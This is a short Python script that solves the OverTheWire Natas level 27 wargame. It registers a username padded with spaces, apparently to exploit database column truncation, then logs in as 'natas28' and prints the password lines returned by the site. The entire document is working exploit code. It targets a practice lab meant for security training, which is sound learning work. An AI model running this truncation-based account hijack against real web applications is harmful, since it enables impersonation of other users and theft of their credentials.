import requests

url = "http://natas27.natas.labs.overthewire.org/"
auth = ("natas27", "[PW_HERE]")

session = requests.Session()
session.auth = (auth)

username = "natas28" + (" "*64) + "mauz"
data = dict(username=username,password="heker")
r = session.post(url, data=data)

new_data = dict(username="natas28",password="heker")
r = session.post(url, data=new_data)

for i in r.iter_lines():
	decoded = i.decode()
	if "password" in decoded:
		print(decoded)
